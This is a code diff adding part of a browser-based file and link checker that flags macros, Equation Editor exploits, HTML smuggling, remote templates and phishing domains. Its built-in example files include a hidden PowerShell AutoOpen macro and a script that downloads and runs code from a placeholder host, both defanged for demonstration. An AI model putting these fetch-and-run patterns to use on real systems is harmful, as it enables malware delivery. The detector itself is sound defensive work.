+    const risky=names.filter(x=>EXEC.has(extOf(x))||SCRIPT.has(extOf(x))||MACRO.has(extOf(x)));
+    F.push([risky.length?'bad':'warn','The PDF has files attached inside it'+(names.length?': '+esc([...new Set(names)].slice(0,5).join(', ')):'')+'.',risky.length?'An attached program or script inside a PDF is a malware trick.':'Only open attachments you expected.']);
+  }
+  if(has('RichMedia'))F.push(['warn','The PDF contains embedded Flash or rich media.','Old attack route. Modern readers block it.']);
+  if(has('XFA'))F.push(['info','The PDF uses an XFA form.','Mostly harmless, but XFA has been used in attacks on old Adobe Reader versions.']);
+  if(has('Encrypt'))F.push(['info','The PDF is encrypted, so some of it can’t be checked here.','']);
+  const links=[...new Set([...t.matchAll(/\/URI\s*\(([^)]{4,300})\)/g)].map(x=>x[1]))];
+  if(links.length)F.push(['info','It contains '+links.length+' link'+(links.length>1?'s':'')+'.','Paste them into <b>Check links</b> below: <code>'+esc(links.slice(0,3).join('  '))+(links.length>3?' …':'')+'</code>']);
+}
+function rtfCheck(b,F){
+  const t=latin1(b,32*1048576).toLowerCase();
+  if(/equation\.3|4571756174696f6e2e33|equation native/.test(t))F.push(['bad','The document contains an old Equation Editor object.','This is used by a well-known exploit (CVE-2017-11882) that runs malware just by opening the document.']);
+  if(t.includes('\\objdata')||t.includes('\\object'))F.push(['warn','The document contains an embedded object.','Embedded objects in RTF files are a common attack route.']);
+  if(t.includes('\\objupdate'))F.push(['bad','The embedded object updates itself automatically when the file opens.','This is used to start an attack without any click.']);
+  if(/\\objclass\s*package/.test(t))F.push(['warn','It contains an embedded file package.','Packages can hold programs and scripts.']);
+}
+function oleCheck(b,F,ext){
+  const t=latin1(b,64*1048576),w=s=>s.split('').join('\0');
+  if(ext==='msi'||t.includes(w('MsiFileHash'))||t.includes('Windows Installer'))F.push(['warn','This is a Windows installer.','It installs a program. Only run installers you trust.']);
+  if(t.includes(w('_VBA_PROJECT'))||t.includes(w('VBA'))&&t.includes('Attribute VB_')){
+    F.push(['warn','The document contains macros.','Macros are small programs. Never press “Enable content” on a document you were sent.']);
+    keywords(t,F,'Macro: ');
+  }
+  if(t.includes(w('Equation Native'))||/Equation\.3/.test(t))F.push(['bad','The document contains an old Equation Editor object.','This is used by a well-known exploit (CVE-2017-11882).']);
+  if(t.includes(w('Ole10Native'))||t.includes(w('ObjectPool')))F.push(['warn','The document contains embedded objects.','Embedded objects can hold programs.']);
+}
+function htmlCheck(t,F,kind){
+  const isSvg=kind==='svg';
+  if(isSvg&&/<script|on(?:load|click|mouseover)\s*=/i.test(t))F.push(['warn','This image (SVG) contains code.','SVG images can run JavaScript when opened in a browser, which is used for phishing.']);
+  if(/type\s*=\s*["']?password/i.test(t))F.push(['warn','It asks for a password.','Web pages sent as attachments that ask you to log in are a very common phishing trick. Never type a password into one.']);
+  if(/new\s+Blob\s*\(/i.test(t)&&/(?:\.download\s*=|msSaveOrOpenBlob|createObjectURL)/i.test(t)&&/atob\s*\(|base64/i.test(t))F.push(['bad','It builds a file and downloads it to you (HTML smuggling).','This hides malware inside a web page so email filters don’t see it.']);
+  if(/(?:window\.|document\.|top\.)location(?:\.href)?\s*=|location\.replace\s*\(|http-equiv\s*=\s*["']?refresh/i.test(t))F.push(['info','It sends you to another web page when opened.','']);
+  keywords(t,F);
+}
+
+// ---------- zip ----------
+function zipEntries(b){
+  let e=-1;for(let i=b.length-22;i>=Math.max(0,b.length-65557);i--)if(b[i]===0x50&&b[i+1]===0x4B&&b[i+2]===5&&b[i+3]===6){e=i;break}
+  if(e<0)return null;
+  const n=u16(b,e+10),cdOff=u32(b,e+16),list=[];let p=cdOff;
+  for(let i=0;i<Math.min(n,5000)&&p+46<=b.length&&u32(b,p)===0x02014b50;i++){
+    const nl=u16(b,p+28),xl=u16(b,p+30),cl=u16(b,p+32);
+    list.push({flags:u16(b,p+8),method:u16(b,p+10),csize:u32(b,p+20),usize:u32(b,p+24),off:u32(b,p+42),name:utf8(b.subarray(p+46,p+46+nl))});
+    p+=46+nl+xl+cl;
+  }
+  return list;
+}
+async function zipRead(b,en,cap){
+  const p=en.off;if(p+30>b.length||u32(b,p)!==0x04034b50)return null;
+  const s=p+30+u16(b,p+26)+u16(b,p+28),data=b.subarray(s,s+en.csize);
+  if(en.flags&1)return null;
+  if(en.method===0)return data.subarray(0,cap);
+  if(en.method===8)return inflate(data,'deflate-raw',cap).catch(()=>null);
+  return null;
+}
+async function zipKind(b){const l=zipEntries(b);return l&&l.some(e=>e.name==='[Content_Types].xml')?'ooxml':'zip'}
+async function officeCheck(b,F){
+  const list=zipEntries(b)||[],names=list.map(e=>e.name);
+  const vba=list.find(e=>/vbaProject\.bin$/i.test(e.name));
+  if(vba){
+    F.push(['warn','The document contains macros.','Macros are small programs. Never press “Enable content” or “Enable editing” on a document you were sent.']);
+    const data=await zipRead(b,vba,32*1048576);if(data)keywords(latin1(data),F,'Macro: ');
+  }
+  if(names.some(n=>/macrosheets\//i.test(n)))F.push(['warn','The workbook contains old Excel 4.0 macro sheets.','These are hidden macro sheets often used by malware.']);
+  if(names.some(n=>/activeX\//i.test(n)))F.push(['warn','The document contains ActiveX controls.','These can run code when the document opens.']);
+  const emb=names.filter(n=>/\/embeddings\//i.test(n));
+  if(emb.length)F.push([emb.some(n=>/oleObject|\.bin$/i.test(n))?'warn':'info','The document has '+emb.length+' embedded file'+(emb.length>1?'s':'')+'.',esc(emb.slice(0,5).map(n=>n.split('/').pop()).join(', '))]);
+  for(const en of list.filter(e=>/\.rels$/i.test(e.name)&&e.usize<2*1048576)){
+    const x=await zipRead(b,en,2*1048576);if(!x)continue;const t=utf8(x);
+    for(const m of t.matchAll(/<Relationship\b[^>]*>/g)){
+      const r=m[0];if(!/TargetMode\s*=\s*["']External/i.test(r))continue;
+      const type=(/Type\s*=\s*["'][^"']*\/([A-Za-z]+)["']/.exec(r)||[])[1]||'',target=(/Target\s*=\s*["']([^"']+)/.exec(r)||[])[1]||'';
+      if(/attachedTemplate|oleObject|frame|subDocument/i.test(type))F.push(['bad','The document loads '+(type==='attachedTemplate'?'a template':'content')+' from the internet when it opens.','This “remote template” trick downloads the real attack later. Target: <code>'+esc(target.slice(0,140))+'</code>']);
+    }
+  }
+}
+async function zipCheck(b,F,depth){
+  const list=zipEntries(b);
+  if(!list){F.push(['warn','The zip file is damaged or uses a format that can’t be read here.','']);return}
+  const files=list.filter(e=>!e.name.endsWith('/'));
+  F.push(['info','The zip contains '+files.length+' file'+(files.length===1?'':'s')+'.',esc(files.slice(0,8).map(e=>e.name).join(', '))+(files.length>8?' …':'')]);
+  if(list.some(e=>e.name==='META-INF/MANIFEST.MF')&&list.some(e=>/\.class$/.test(e.name)))F.push(['warn','This is a Java program (.jar).','Only run Java programs you trust.']);
+  if(list.some(e=>e.name==='AndroidManifest.xml')&&list.some(e=>/classes\d*\.dex$/.test(e.name)))F.push(['warn','This is an Android app.','Only install apps from Google Play. Apps sent by message are a common way to steal bank logins.']);
+  const enc=files.filter(e=>e.flags&1);
+  if(enc.length)F.push(['warn','The zip is password-protected ('+enc.length+' file'+(enc.length>1?'s':'')+').','Passwords on zip files hide malware from email scanners, and the contents can’t be checked here. Only open it if you expected it from someone you know.']);
+  const total=files.reduce((s,e)=>s+e.usize,0),comp=files.reduce((s,e)=>s+e.csize,0);
+  if(total>4*1073741824||(comp>0&&total/comp>200&&total>256*1048576))F.push(['warn','This could be a “zip bomb”.','It would unpack to '+fmtSize(total)+' and can fill your disk or freeze your computer.']);
+  if(files.some(e=>/(^|[\/\\])\.\.([\/\\]|$)/.test(e.name)||/^([A-Za-z]:|\/)/.test(e.name)))F.push(['warn','Some files try to unpack outside the folder you choose.','This “path traversal” trick can overwrite files on your computer.']);
+  for(const e of files)nameCheck(e.name.split(/[\/\\]/).pop(),F,e.name);
+  // Look inside the files too.
+  if(depth<2){
+    for(const e of files.slice(0,150)){
+      if(e.flags&1||e.usize>32*1048576)continue;
+      const data=await zipRead(b,e,32*1048576);if(!data)continue;
+      const sub=await analyze(data,e.name.split(/[\/\\]/).pop(),depth+1);
+      const pre='Inside the zip, “'+esc(e.name)+'”: ',named=F.some(f=>f[1].startsWith(pre+'This is'));
+      sub.F.filter(f=>(f[0]==='bad'||f[0]==='warn')&&!(named&&f[1].startsWith('This is '))).forEach(f=>F.push([f[0],f[1].startsWith('Inside the zip')?f[1]:pre+f[1].charAt(0).toLowerCase()+f[1].slice(1),f[2]]));
+    }
+  }
+}
+
+// ---------- results ----------
+const VERDICT={
+  bad:['⛔ Dangerous','Don’t open this file. Delete it. If it came by email, tell the sender (by phone or a new message — not by replying) in case their account was hacked.'],
+  warn:['⚠️ Be careful','Only open it if you were expecting it and trust where it came from. Check with the sender if you’re not sure.'],
+  good:['✅ No warning signs','None of the tricks we check for were found. This doesn’t prove it is safe, so keep your antivirus on and look it up on VirusTotal if you are unsure.']
+};
+const ICON={bad:'⛔',warn:'⚠️',info:'ℹ️',ok:'✅'};
+const items=[];let seq=0;
+async function sha256(buf){const h=await crypto.subtle.digest('SHA-256',buf);return [...new Uint8Array(h)].map(x=>x.toString(16).padStart(2,'0')).join('')}
+async function checkFile(file){
+  const id='file-'+(seq++),it={name:file.name,size:file.size,id};items.push(it);
+  const card=document.createElement('div');card.className='fcard busy';card.id=id;
+  card.innerHTML='<div class="fhead"><div><div class="fname">'+esc(file.name)+'</div><div class="fmeta">'+fmtSize(file.size)+'</div></div><span class="pill">Checking…</span></div>';
+  $('results').prepend(card);$('clearBtn').classList.remove('hidden');
+  try{
+    let bytes,partial=false;
+    if(file.size>512*1048576){bytes=new Uint8Array(await file.slice(0,64*1048576).arrayBuffer());partial=true}
+    else bytes=new Uint8Array(await file.arrayBuffer());
+    const {F,kind}=await analyze(bytes,file.name,0);
+    it.hash=partial?'':await sha256(bytes);
+    if(it.hash===EICAR_SHA&&!F.some(f=>f[1].includes('EICAR')))F.push(['bad','This is the EICAR antivirus test file.','It is harmless, and exists to test antivirus.']);
+    if(partial)F.push(['info','Large file: only the first 64 MB was checked, and no fingerprint was made.','']);
+    // de-duplicate identical messages
+    const seen=new Set(),macros=F.some(f=>f[1]==='The document contains macros.');it.F=F.filter(f=>{const k=f[1];if(seen.has(k)||(macros&&/can contain macros/.test(k)))return false;seen.add(k);return true});
+    it.kind=kind;it.level=it.F.some(f=>f[0]==='bad')?'bad':it.F.some(f=>f[0]==='warn')?'warn':'good';
+  }catch(e){it.F=[['warn','This file could not be read: '+esc(e.message),'']];it.level='warn';it.kind='unknown'}
+  render(card,it);summary();
+}
+function render(card,it){
+  const v=VERDICT[it.level],order={bad:0,warn:1,info:2,ok:3};
+  const F=[...it.F].sort((a,b)=>order[a[0]]-order[b[0]]);
+  card.className='fcard '+it.level;
+  card.innerHTML='<div class="fhead"><div><div class="fname">'+esc(it.name)+'</div><div class="fmeta">'+fmtSize(it.size)+' · really '+KIND[it.kind]+'</div></div><span class="pill">'+v[0]+'</span></div>'+
+    '<div class="verdict">'+v[1]+'</div>'+
+    (F.length?'<ul class="finds">'+F.map(f=>'<li><span class="ic">'+ICON[f[0]]+'</span><span>'+f[1]+(f[2]?'<small>'+f[2]+'</small>':'')+'</span></li>').join('')+'</ul>':'')+
+    (it.hash?'<div class="hashrow"><span class="muted">Fingerprint (SHA-256)</span><code>'+it.hash+'</code><button type="button" data-copy="'+it.hash+'">📋 Copy</button><a href="https://www.virustotal.com/gui/file/'+it.hash+'" target="_blank" rel="noopener" class="vt">Look up on VirusTotal ↗</a><a href="https://bazaar.abuse.ch/browse.php?search=sha256%3A'+it.hash+'" target="_blank" rel="noopener">MalwareBazaar ↗</a></div>':'');
+}
+function summary(){
+  const done=items.filter(i=>i.level),c={bad:0,warn:0,good:0};done.forEach(i=>c[i.level]++);
+  $('summary').innerHTML=done.length?'<span style="--vc:#16202b"><b>'+done.length+'</b> checked</span>'+(c.bad?'<span style="--vc:#D8604A">⛔ Dangerous: <b>'+c.bad+'</b></span>':'')+(c.warn?'<span style="--vc:#E2A63B">⚠️ Be careful: <b>'+c.warn+'</b></span>':'')+(c.good?'<span style="--vc:#4E9E73">✅ No warning signs: <b>'+c.good+'</b></span>':''):'';
+  $('reportRow').classList.toggle('hidden',!done.length);
+}
+const strip=h=>{const d=document.createElement('div');d.innerHTML=h;return d.textContent};
+$('reportBtn').onclick=()=>{
+  const lines=['Virus Check Forge report — '+new Date().toLocaleString(),'Checked in the browser at https://migabuilder.com/virus-check-forge.html','“No warning signs” does not prove a file is safe.',''];
+  items.filter(i=>i.level).forEach(i=>{lines.push('== '+i.name+' ('+fmtSize(i.size)+', really '+KIND[i.kind]+')','Result: '+strip(VERDICT[i.level][0]));i.F.forEach(f=>lines.push('  ['+f[0]+'] '+strip(f[1])+(f[2]?' — '+strip(f[2]):'')));if(i.hash)lines.push('  SHA-256: '+i.hash,'  VirusTotal: https://www.virustotal.com/gui/file/'+i.hash);lines.push('')});
+  const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([lines.join('\n')],{type:'text/plain'}));a.download='virus-check-report.txt';a.click();setTimeout(()=>URL.revokeObjectURL(a.href),1500);
+};
+document.addEventListener('click',e=>{const b=e.target.closest('[data-copy]');if(!b)return;const t=b.dataset.copy;(navigator.clipboard?navigator.clipboard.writeText(t):Promise.reject()).catch(()=>{}).finally(()=>{b.textContent='✓ Copied';setTimeout(()=>b.textContent='📋 Copy',1400)})});
+const addFiles=fs=>{[...fs].forEach(checkFile)};
+$('fileInput').onchange=e=>{addFiles(e.target.files);e.target.value=''};
+$('clearBtn').onclick=()=>{items.length=0;$('results').innerHTML='';summary();$('clearBtn').classList.add('hidden')};
+const dz=$('dropZone');
+addEventListener('dragover',e=>{if([...e.dataTransfer.types].includes('Files')){e.preventDefault();dz.classList.add('over')}});
+addEventListener('dragleave',e=>{if(!e.relatedTarget)dz.classList.remove('over')});
+addEventListener('drop',e=>{if(!e.dataTransfer.files.length)return;e.preventDefault();dz.classList.remove('over');addFiles(e.dataTransfer.files)});
+
+// ---------- example files (made here, in memory; none of them can run) ----------
+const enc=s=>new TextEncoder().encode(s);
+const CRC=(()=>{const t=new Uint32Array(256);for(let n=0;n<256;n++){let c=n;for(let k=0;k<8;k++)c=c&1?0xEDB88320^(c>>>1):c>>>1;t[n]=c>>>0}return t})();
+const crc32=b=>{let c=0xFFFFFFFF;for(const x of b)c=CRC[(c^x)&255]^(c>>>8);return (c^0xFFFFFFFF)>>>0};
+function makeZip(files){ // stored (uncompressed) zip
+  const parts=[],cd=[];let off=0;
+  const w16=(a,v)=>a.push(v&255,v>>8&255),w32=(a,v)=>a.push(v&255,v>>8&255,v>>16&255,v>>>24&255);
+  for(const [nm,data] of files){
+    const n=enc(nm),c=crc32(data),h=[];w32(h,0x04034b50);w16(h,20);w16(h,0x800);w16(h,0);w32(h,0);w32(h,c);w32(h,data.length);w32(h,data.length);w16(h,n.length);w16(h,0);
+    const local=new Uint8Array([...h,...n]);parts.push(local,data);
+    const d=[];w32(d,0x02014b50);w16(d,20);w16(d,20);w16(d,0x800);w16(d,0);w32(d,0);w32(d,c);w32(d,data.length);w32(d,data.length);w16(d,n.length);w16(d,0);w16(d,0);w16(d,0);w16(d,0);w32(d,0);w32(d,off);
+    cd.push(new Uint8Array([...d,...n]));off+=local.length+data.length;
+  }
+  const cdLen=cd.reduce((s,x)=>s+x.length,0),e=[];w32(e,0x06054b50);w16(e,0);w16(e,0);w16(e,files.length);w16(e,files.length);w32(e,cdLen);w32(e,off);w16(e,0);
+  return new Blob([...parts,...cd,new Uint8Array(e)]);
+}
+function fakeProgram(){ // only the header of a Windows program: it has no code and cannot run
+  const b=new Uint8Array(1024);b.set(enc('MZ'));b[0x3C]=0x80;b.set(enc('This program cannot be run in DOS mode.'),0x4E);
+  b.set(enc('PE\0\0'),0x80);b[0x84]=0x64;b[0x85]=0x86;b[0x94]=240;b[0x96]=0x22;b[0x98]=0x0b;b[0x99]=0x02;return b;
+}
+async function examples(){
+  const sh='WScript'+'.Shell',ps='power'+'shell';
+  const macro='Attribute VB_Name = "ThisDocument"\r\nSub Auto'+'Open()\r\n  Set s = CreateObject("'+sh+'")\r\n  s.Run "'+ps+' -w hidden -e'+'nc '+btoa('Write-Output "example only"').replace(/=/g,'')+'QQBBAEEA", 0\r\nEnd Sub\r\n';
+  const docm=makeZip([['[Content_Types].xml',enc('<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/></Types>')],['word/document.xml',enc('<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Please enable content to see this report.</w:t></w:r></w:p></w:body></w:document>')],['word/vbaProject.bin',enc(macro)]]);
+  const js='var s = new ActiveXObject("'+sh+'");\r\n// example only: the address below does not exist\r\ns.Run("'+ps+' -w hidden IEX (New-Object Net.WebClient).Download'+'String(\'https://example.invalid/a\')", 0);\r\n';
+  const zip=makeZip([['Scan_0042.pdf.js',enc(js)]]);
+  const pdf=enc('%PDF-1.7\n1 0 obj << /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >> endobj\n2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj\n3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [5 0 R] >> endobj\n4 0 obj << /S /JavaScript /JS (app.alert\\("Example only"\\);) >> endobj\n5 0 obj << /Type /Annot /Subtype /Link /Rect [0 0 612 792] /A << /S /URI /URI (http://paypa1-account-verify.com/login) >> >> endobj\ntrailer << /Root 1 0 R >>\n%%EOF\n');
+  const eicar='X5O!P%@AP[4\\PZX54(P^)7CC)7}$'+EICAR_TAG+'!$H+H*';
+  const cv=document.createElement('canvas');cv.width=480;cv.height=320;const g=cv.getContext('2d');
+  const sky=g.createLinearGradient(0,0,0,320);sky.addColorStop(0,'#5ab0f2');sky.addColorStop(1,'#cdeaff');g.fillStyle=sky;g.fillRect(0,0,480,320);
+  g.fillStyle='#ffd43b';g.beginPath();g.arc(380,80,40,0,7);g.fill();g.fillStyle='#e9c98a';g.fillRect(0,230,480,90);g.fillStyle='#2f8fbf';g.fillRect(0,200,480,34);
+  const jpg=await new Promise(r=>cv.toBlob(r,'image/jpeg',0.85));
+  return [
+    new File([fakeProgram()],'Invoice_2026-0912.pdf',{type:'application/pdf'}),
+    new File([docm],'Quarterly report.docm'),
+    new File([zip],'Scan_0042.zip',{type:'application/zip'}),
+    new File([pdf],'Order form.pdf',{type:'application/pdf'}),
+    new File([eicar],'eicar-test-file.txt',{type:'text/plain'}),
+    new File([jpg],'holiday-photo.jpg',{type:'image/jpeg'})
+  ];
+}
+$('exampleBtn').onclick=async()=>{const fs=await examples();for(const f of fs.reverse())await checkFile(f)};
+
+// ---------- links ----------
+const BRANDS={paypal:['paypal.com','paypal.me'],apple:['apple.com','icloud.com'],icloud:['icloud.com','apple.com'],microsoft:['microsoft.com','live.com','office.com','microsoftonline.com','azure.com'],outlook:['outlook.com','live.com','office.com','microsoft.com'],office:['office.com','microsoft.com','office365.com'],google:['google.com','youtube.com','goo.gl','g.co','googleusercontent.com'],gmail:['gmail.com','google.com'],amazon:['amazon.com','amazon.co.uk','amazon.de','amazon.se','amazon.fr','amazon.es','amazon.it','amazon.ca','amazon.in','amazon.co.jp','amazon.com.au','amzn.to','aws.amazon.com'],netflix:['netflix.com'],facebook:['facebook.com','fb.com','fb.me','meta.com'],instagram:['instagram.com'],whatsapp:['whatsapp.com','wa.me'],linkedin:['linkedin.com','lnkd.in'],dropbox:['dropbox.com'],docusign:['docusign.com','docusign.net'],adobe:['adobe.com'],steam:['steampowered.com','steamcommunity.com'],roblox:['roblox.com'],coinbase:['coinbase.com'],binance:['binance.com'],metamask:['metamask.io'],dhl:['dhl.com','dhl.de','dhl.se'],fedex:['fedex.com'],ups:['ups.com'],usps:['usps.com'],royalmail:['royalmail.com'],postnord:['postnord.se','postnord.com','postnord.dk'],irs:['irs.gov'],hmrc:['gov.uk'],skatteverket:['skatteverket.se'],bankid:['bankid.com'],swedbank:['swedbank.se','swedbank.com'],nordea:['nordea.se','nordea.com','nordea.fi','nordea.dk','nordea.no'],handelsbanken:['handelsbanken.se','handelsbanken.com'],chase:['chase.com'],wellsfargo:['wellsfargo.com'],bankofamerica:['bankofamerica.com'],spotify:['spotify.com'],ebay:['ebay.com','ebay.co.uk','ebay.de'],walmart:['walmart.com'],tiktok:['tiktok.com'],twitter:['twitter.com','x.com','t.co'],yahoo:['yahoo.com']};
+const SHORT=set('bit.ly tinyurl.com t.co goo.gl ow.ly is.gd cutt.ly rebrand.ly shorturl.at tiny.cc rb.gy t.ly buff.ly s.id v.gd qrco.de');
+const RISKY_TLD=set('zip mov top xyz click country gq tk ml cf ga work support rest cam icu monster buzz lol quest sbs cfd bond hair beauty');
+const SLD=set('co.uk org.uk ac.uk gov.uk me.uk com.au net.au org.au co.nz co.jp com.br com.mx co.za co.in com.cn com.tr com.sg com.hk co.kr com.ar');
+const regDomain=h=>{const p=h.split('.');if(p.length<=2)return h;const last2=p.slice(-2).join('.');return SLD.has(last2)?p.slice(-3).join('.'):last2};
+const unleet=s=>s.replace(/0/g,'o').replace(/1/g,'l').replace(/3/g,'e').replace(/4/g,'a').replace(/5/g,'s').replace(/7/g,'t').replace(/rn/g,'m').replace(/vv/g,'w');
+function checkUrl(raw){
+  const F=[];let s=raw.trim().replace(/[)\].,;!?'"»]+$/,'');
+  if(/^(javascript|data|vbscript):/i.test(s))return {s,F:[['bad','This is not a web address but code ('+esc(s.split(':')[0])+':).','Never paste or open it.']]};
+  if(!/^[a-z][a-z0-9+.-]*:\/\//i.test(s))s='https://'+s;
+  let u;try{u=new URL(s)}catch(e){return {s,F:[['warn','This doesn’t look like a valid web address.','']]}}
+  const host=u.hostname.toLowerCase().replace(/\.$/,''),rd=regDomain(host),rawHost=(/^[a-z][a-z0-9+.-]*:\/\/(?:[^@\/?#]*@)?([^\/?#:]+)/i.exec(s)||[])[1]||'';
+  if(u.username||u.password)F.push(['bad','The real address is hidden after an “@”.','Everything before the @ is ignored. This link really goes to <b>'+esc(host)+'</b>.']);
+  if(/^\d{1,3}(\.\d{1,3}){3}$/.test(host)||host.startsWith('['))F.push(['warn','The link uses a raw number (IP address) instead of a name.','Real companies use their name in links.']);
+  if(/xn--/.test(host)||/[^\x00-\x7F]/.test(rawHost))F.push(['bad','The address uses international look-alike letters.','For example a Cyrillic “а” that looks just like a Latin “a”. It may imitate a real site. The real address is <code>'+esc(host)+'</code>.']);
+  const tokens=host.split(/[.\-]/).map(unleet);
+  for(const [brand,doms] of Object.entries(BRANDS)){
+    if(!tokens.some(t=>t===brand||(brand.length>=5&&(t.startsWith(brand)||t.endsWith(brand)))))continue;
+    if(doms.some(d=>host===d||host.endsWith('.'+d)))F.push(['ok','This is a real '+esc(rd)+' address.','Still, if a message pushed you to log in urgently, open the site yourself instead of using the link.']);
+    else F.push(['bad','It uses the name “'+brand+'”, but it is not '+brand+'’s real website.','The real owner of this link is <b>'+esc(rd)+'</b>. This is how phishing sites copy a brand.']);
+    break;
+  }
+  const tld=host.split('.').pop();
+  if(RISKY_TLD.has(tld))F.push(['warn','The address ends in “.'+tld+'”, '+(tld==='zip'||tld==='mov'?'which looks like a file name but is a website.':'which is used a lot by scam sites.'),'']);
+  if(SHORT.has(host))F.push(['warn','This is a short link that hides where it really goes.','Ask the sender for the full address, or use a link expander.']);
+  if(host.split('.').length>4)F.push(['warn','The address has many parts before the real domain.','Scam links stuff real names at the start, like apple.com.example.top. The real owner is <b>'+esc(rd)+'</b>.']);
+  if(u.protocol==='http:')F.push(['info','The connection isn’t encrypted (http, not https).','Never type a password or card number on this page.']);
+  const e=extOf(u.pathname);if(EXEC.has(e)||SCRIPT.has(e)||DISK.has(e))F.push(['warn','The link downloads a program or script (.'+e+').','Only download programs from the maker’s own website.']);
+  if(/login|log-in|signin|sign-in|verify|account|secure|update|unlock|suspend|confirm|wallet|password|billing/i.test(u.pathname+host)&&F.some(f=>f[0]!=='ok'&&f[0]!=='info'))F.push(['warn','It asks you to log in, verify or update something.','Together with the signs above, this is typical of a phishing link.']);
+  if(s.length>250)F.push(['info','The link is very long.','Long links can hide the real destination in the middle.']);
+  return {s,host,F};
+}
+function checkLinks(){
+  const text=$('urlInput').value;let found=text.match(/\b(?:https?:\/\/|www\.)[^\s<>"']+|\b(?:javascript|data):[^\s<>"']+/gi)||[];
+  if(!found.length)found=text.split(/\s+/).filter(w=>/^[a-z0-9-]+(\.[a-z0-9-]+)+(\/\S*)?$/i.test(w));
+  found=[...new Set(found)].slice(0,50);
+  if(!found.length){$('urlResults').innerHTML='<p class="muted">No links found. Paste a full address such as https://example.com/page.</p>';return}
+  $('urlResults').innerHTML=found.map((raw,i)=>{
+    const {s,F}=checkUrl(raw),lvl=F.some(f=>f[0]==='bad')?'bad':F.some(f=>f[0]==='warn')?'warn':'good',order={bad:0,warn:1,ok:2,info:3};
+    F.sort((a,b)=>order[a[0]]-order[b[0]]);
+    const v={bad:['⛔ Dangerous','Don’t open this link.'],warn:['⚠️ Be careful','Don’t log in or download anything from it unless you are sure.'],good:['✅ No warning signs','Nothing suspicious in the address itself. That doesn’t prove the page is safe.']}[lvl];
+    return '<div class="fcard '+lvl+'" id="url-'+i+'"><div class="fhead"><div class="fname" style="font-family:\'IBM Plex Mono\',monospace;font-size:13px">'+esc(raw)+'</div><span class="pill">'+v[0]+'</span></div><div class="verdict">'+v[1]+'</div>'+
+      (F.length?'<ul class="finds">'+F.map(f=>'<li><span class="ic">'+ICON[f[0]]+'</span><span>'+f[1]+(f[2]?'<small>'+f[2]+'</small>':'')+'</span></li>').join('')+'</ul>':'')+
+      (/^https?:/i.test(s)?'<div class="hashrow"><a href="https://www.virustotal.com/gui/search/'+encodeURIComponent(encodeURIComponent(s))+'" target="_blank" rel="noopener">Look up on VirusTotal ↗</a><a href="https://transparencyreport.google.com/safe-browsing/search?url='+encodeURIComponent(s)+'" target="_blank" rel="noopener">Google Safe Browsing ↗</a></div>':'')+'</div>';
+  }).join('');
+}
+$('urlBtn').onclick=checkLinks;
+$('urlExampleBtn').onclick=()=>{$('urlInput').value='Your account has been suspended! Verify within 24 hours: http://paypa1-account-verify.com/login\nOr sign in here: https://www.apple.com.id-check.secure-login.top/verify\nTrack your parcel: https://bit.ly/3xP4rcl\nhttps://www.paypal.com/signin';checkLinks()};
+})();
+</script>
+<script src="tutorials.js" defer></script>
+</body>
+</html>
